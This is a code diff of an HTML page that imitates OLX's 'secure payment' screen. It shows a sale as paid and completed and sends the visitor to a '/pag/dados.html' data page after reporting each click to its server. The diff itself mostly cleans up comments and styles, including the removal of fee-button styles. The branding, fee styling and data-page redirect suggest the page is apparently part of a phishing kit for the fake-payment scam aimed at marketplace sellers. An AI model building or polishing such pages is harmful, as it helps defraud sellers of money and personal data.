@@ -48,7 +48,6 @@
                 <div class="logo">
                     <img src="/images/olx-logo.png" alt="Logo OLX">
                 </div>
-
             </div>
         </header>
 
@@ -117,7 +116,6 @@
                                 </div>
                                 <p id="produtos-vendidos-container"><i class="fas fa-tag"></i> <span
                                         id="vendedor-produtos"></span> produtos vendidos</p>
-                              
                             </div>
                         </div>
                     </div>
@@ -129,31 +127,26 @@
                                 <i class="fas fa-check-circle"></i>
                                 <div>
                                     <p class="titulo">Anúncio publicado</p>
-
                                 </div>
                             </li>
                             <li class="concluido">
                                 <i class="fas fa-check-circle"></i>
                                 <div>
                                     <p class="titulo">Comprador interessado</p>
-
                                 </div>
                             </li>
                             <li class="concluido">
                                 <i class="fas fa-check-circle"></i>
                                 <div>
                                     <p class="titulo">Pagamento realizado</p>
-
                                 </div>
                             </li>
                             <li class="concluido">
                                 <i class="fas fa-check-circle"></i>
                                 <div>
                                     <p class="titulo">Venda concluída</p>
-
                                 </div>
                             </li>
-
                         </ul>
                     </div>
                 </div>
@@ -188,15 +181,10 @@
                             <p>Pagamento OLX <i class="fas fa-shield-alt"></i> <span class="texto-seguro">Seguro</span>
                             </p>
                         </div>
-
                     </div>
-
-                    <!-- Removido: card de ações disponíveis -->
                 </div>
             </div>
         </main>
-
-        <!-- Removido: seção de detalhes da transação com resumo e cronograma -->
 
         <div class="dicas-seguranca">
             <div class="dica-card">
@@ -254,7 +242,6 @@
                         <a href="#"><i class="fab fa-youtube"></i></a>
                         <a href="#"><i class="fab fa-linkedin"></i></a>
                     </div>
-
                 </div>
             </div>
             <div class="footer-bottom">
@@ -281,11 +268,11 @@
     <script src="/js/script.js"></script>
 
     <style>
-        /* Melhorias gerais de estilo */
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: #f5f5f5;
             color: #333;
+            overflow-x: hidden;
         }
 
         .app-container {
@@ -319,11 +306,12 @@
             background-color: #5708aa;
         }
 
-        /* Estilos para a galeria de imagens */
+        /* CORREÇÃO DAS IMAGENS */
         .produto-galeria {
             display: flex;
             flex-direction: column;
             max-width: 500px;
+            width: 100%;
         }
 
         .imagem-principal {
@@ -331,8 +319,7 @@
             margin-bottom: 15px;
             border-radius: 12px;
             overflow: hidden;
-            height: 450px;
-            /* Altura maior */
+            height: 380px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -343,7 +330,7 @@
         .imagem-principal img {
             width: 100%;
             height: 100%;
-            object-fit: contain;
+            object-fit: cover; /* Remove as tarjas brancas esticando/preenchendo perfeitamente */
         }
 
         .miniaturas {
@@ -356,9 +343,7 @@
 
         .miniatura {
             width: 90px;
-            /* Miniaturas maiores */
             height: 90px;
-            /* Miniaturas maiores */
             object-fit: cover;
             border-radius: 8px;
             cursor: pointer;
@@ -378,7 +363,6 @@
             box-shadow: 0 2px 8px rgba(110, 10, 214, 0.3);
         }
 
-        /* Adiciona indicadores de rolagem quando há muitas imagens */
         .miniaturas::-webkit-scrollbar {
             height: 6px;
         }
@@ -388,7 +372,6 @@
             border-radius: 6px;
         }
 
-        /* Status da venda */
         .timeline li.pendente {
             color: #e74c3c;
         }
@@ -419,25 +402,6 @@
             margin-left: 8px;
         }
 
-        /* Melhorias nos botões */
-        .btn-imprimir,
-        .btn-reportar,
-        .btn-avaliar,
-        .btn-contato {
-            border-radius: 8px;
-            padding: 10px 16px;
-            transition: transform 0.2s ease, box-shadow 0.2s ease;
-        }
-
-        .btn-imprimir:hover,
-        .btn-reportar:hover,
-        .btn-avaliar:hover,
-        .btn-contato:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
-        }
-
-        /* Melhorias na visualização de produtos */
         .produto-info {
             gap: 25px;
             padding: 25px;
@@ -461,7 +425,6 @@
             margin-top: 8px;
         }
 
-        /* Cards com destaque */
         .card-column {
             gap: 20px;
         }
@@ -480,7 +443,6 @@
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
         }
 
-        /* Status da venda centralizado e melhorado */
         .timeline {
             width: 100%;
             display: flex;
@@ -501,12 +463,6 @@
             background-color: #f0f8f2;
         }
 
-        .timeline li.pendente {
-            color: #e74c3c;
-            background-color: #fdf1f0;
-            border: 1px solid #fadbd8;
-        }
-
         .timeline li i {
             font-size: 1.5rem;
             margin-bottom: 8px;
@@ -518,51 +474,6 @@
             margin-bottom: 4px;
         }
 
-        .btn-taxa {
-            background-color: #e74c3c;
-            color: white;
-            border: none;
-            border-radius: 20px;
-            padding: 8px 20px;
-            cursor: pointer;
-            margin-top: 10px;
-            font-weight: bold;
-            transition: all 0.3s ease;
-            box-shadow: 0 2px 5px rgba(231, 76, 60, 0.3);
-        }
-
-        .btn-taxa:hover {
-            background-color: #c0392b;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(231, 76, 60, 0.4);
-        }
-
-        /* Taxa destaque sem valor específico */
-        .taxa-destaque {
-            padding: 15px;
-            margin-top: 15px;
-            text-align: center;
-            border: 1px dashed #e74c3c;
-            border-radius: 10px;
-            background-color: #fff5f5;
-        }
-
-        .taxa-valor {
-            font-weight: bold;
-            color: #e74c3c;
-            font-size: 1.1rem;
-        }
-
-        .badge-pendente {
-            background-color: #e74c3c;
-            color: white;
-            font-size: 0.8rem;
-            padding: 3px 10px;
-            border-radius: 20px;
-            margin-left: 8px;
-        }
-
-        /* Estilos para as novas seções */
         .secao-titulo {
             text-align: center;
             margin: 30px 0 20px;
@@ -579,7 +490,6 @@
             color: #6e0ad6;
         }
 
-        /* Produtos recomendados */
         .produtos-recomendados {
             margin: 40px 0;
             padding: 20px;
@@ -683,22 +593,6 @@
             background-color: #5708aa;
         }
 
-        /* Estilo para imagem de fallback */
-        .fallback-img {
-            width: 100%;
-            height: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: linear-gradient(135deg, #f0f0f0, #e0e0e0);
-        }
-
-        .fallback-img i {
-            font-size: 3rem;
-            color: #6e0ad6;
-        }
-
-        /* Estilo para mensagem de erro de produtos */
         .erro-produtos {
             text-align: center;
             padding: 30px;
@@ -715,18 +609,6 @@
             margin: 0;
         }
 
-        /* Responsividade */
-        @media (max-width: 768px) {
-            .cards-horizontal {
-                grid-template-columns: 1fr;
-            }
-
-            .produtos-grid {
-                grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            }
-        }
-
-        /* Melhorias de responsividade para dispositivos móveis */
         @media (max-width: 768px) {
             .app-container {
                 padding: 0 10px;
@@ -749,7 +631,7 @@
             }
 
             .imagem-principal {
-                height: 300px;
+                height: 280px;
             }
 
             .miniatura {
@@ -757,7 +639,6 @@
                 height: 70px;
             }
 
-            /* Aumentar área de toque para elementos interativos */
             .btn-taxa,
             .btn-contato,
             .btn-continuar,
@@ -767,99 +648,57 @@
                 font-size: 16px;
             }
 
-            /* Melhorar timeline em dispositivos móveis */
             .timeline li {
                 width: 100%;
             }
-
-            /* Tornar botões mais visíveis */
-            .btn-taxa {
-                margin-top: 15px;
-            }
         }
 
-        /* Corrigir problema de scroll horizontal */
-        body {
-            overflow-x: hidden;
-        }
-
-        /* Garantir que imagens se ajustem corretamente */
         img {
             max-width: 100%;
         }
-
-        /* Melhorar feedback de toque para elementos interativos */
-        .miniatura,
-        .btn-taxa,
-        .btn-contato,
-        .btn-continuar,
-        .btn-ver-produto {
-            -webkit-tap-highlight-color: rgba(110, 10, 214, 0.2);
-        }
     </style>
 
-    <!-- Adicionar script para criar placeholder de imagem caso a imagem padrão não seja encontrada -->
     <script>
-        // Criar placeholder de imagem para fallback
         function criarImagemPlaceholder() {
-            // Verificar se já existe o elemento no DOM
-            if (document.getElementById('produto-placeholder-img')) {
-                return;
-            }
+            if (document.getElementById('produto-placeholder-img')) return;
 
-            // Criar elemento canvas para gerar uma imagem placeholder
             const canvas = document.createElement('canvas');
             canvas.width = 250;
             canvas.height = 180;
             const ctx = canvas.getContext('2d');
 
-            // Preencher fundo
             ctx.fillStyle = '#f0f0f0';
             ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-            // Adicionar texto
             ctx.fillStyle = '#6e0ad6';
             ctx.font = 'bold 20px sans-serif';
             ctx.textAlign = 'center';
             ctx.textBaseline = 'middle';
             ctx.fillText('Produto OLX', canvas.width / 2, canvas.height / 2);
 
-            // Adicionar borda
             ctx.strokeStyle = '#ccc';
             ctx.lineWidth = 2;
             ctx.strokeRect(5, 5, canvas.width - 10, canvas.height - 10);
 
-            // Adicionar ícone
-            ctx.fillStyle = '#6e0ad6';
-            ctx.beginPath();
-            ctx.arc(canvas.width / 2, 50, 20, 0, Math.PI * 2);
-            ctx.fill();
-
-            // Converter para URL de dados
             const dataUrl = canvas.toDataURL('image/png');
-
-            // Criar elemento de imagem e adicionar ao DOM
             const img = document.createElement('img');
             img.id = 'produto-placeholder-img';
             img.src = dataUrl;
             img.style.display = 'none';
             document.body.appendChild(img);
 
-            // Substituir todas as imagens com erro pelo placeholder
             document.querySelectorAll('.produto-img img[onerror]').forEach(img => {
                 img.onerror = function () {
                     this.src = dataUrl;
-                    this.onerror = null; // Evita loop infinito
+                    this.onerror = null;
                 };
             });
 
             return dataUrl;
         }
 
-        // Executar após o carregamento da página
         window.addEventListener('load', criarImagemPlaceholder);
 
-        // Verificar imagens com erro após 1 segundo (para dar tempo de carregar)
         setTimeout(() => {
             document.querySelectorAll('.produto-img img').forEach(img => {
                 if (!img.complete || img.naturalHeight === 0) {
@@ -875,18 +714,13 @@
         }, 1000);
     </script>
 
-
-
-    <!-- Adicionar script para notificação de clique no botão continuar -->
     <script>
         function notificarCliqueContinuar() {
-            // Obter código da venda e nome do produto da página
             const codigoVenda = document.getElementById('venda-codigo')?.textContent ||
                 document.getElementById('venda-codigo-small')?.textContent ||
                 "Não informado";
             const nomeProduto = document.getElementById('produto-nome')?.textContent || "Não informado";
 
-            // Enviar notificação ao servidor
             fetch('/api/notificar-clique-continuar', {
                 method: 'POST',
                 headers: {
@@ -900,12 +734,10 @@
                 .then(response => response.json())
                 .then(data => {
                     console.log('Notificação enviada:', data);
-                    // Modificado: Incluir o código da venda na URL de redirecionamento
                     window.location.href = `/pag/dados.html?id=${encodeURIComponent(codigoVenda)}`;
                 })
                 .catch(error => {
                     console.error('Erro ao enviar notificação:', error);
-                    // Modificado: Incluir o código da venda mesmo em caso de erro
                     window.location.href = `/pag/dados.html?id=${encodeURIComponent(codigoVenda)}`;
                 });
         }
